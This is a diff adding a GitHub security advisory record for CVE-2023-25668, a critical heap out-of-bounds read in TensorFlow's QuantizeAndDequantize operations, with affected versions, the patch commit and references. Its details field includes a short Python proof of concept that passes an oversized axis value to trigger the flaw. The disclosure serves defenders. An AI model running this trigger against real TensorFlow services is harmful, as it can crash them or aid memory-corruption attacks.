@@ -1,0 +1,104 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-gw97-ff7c-9v96",
+  "modified": "2023-03-27T22:03:05Z",
+  "published": "2023-03-24T21:57:01Z",
+  "aliases": [
+    "CVE-2023-25668"
+  ],
+  "summary": "TensorFlow has a heap out-of-buffer read vulnerability in the QuantizeAndDequantize operation",
+  "details": "### Impact\nAttackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.\nWhen axis is larger than the dim of input, c->Dim(input,axis) goes out of bound.\nSame problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],\n    \t\t\t\t\t\t\t\t   input_min=[1.0],\n    \t\t\t\t\t\t\t\t   input_max=[10.0],\n    \t\t\t\t\t\t\t\t   signed_input=True,\n    \t\t\t\t\t\t\t\t   num_bits=1,\n    \t\t\t\t\t\t\t\t   range_given=True,\n    \t\t\t\t\t\t\t\t   round_mode='HALF_TO_EVEN',\n    \t\t\t\t\t\t\t\t   narrow_range=True,\n    \t\t\t\t\t\t\t\t   axis=0x7fffffff)\ntest()\n```\n\n\n\n### Patches\nWe have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tensorflow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tensorflow-cpu"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tensorflow-gpu"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gw97-ff7c-9v96"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25668"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tensorflow/tensorflow"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-122",
+      "CWE-125"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-03-24T21:57:01Z",
+    "nvd_published_at": "2023-03-25T00:15:00Z"
+  }
+}
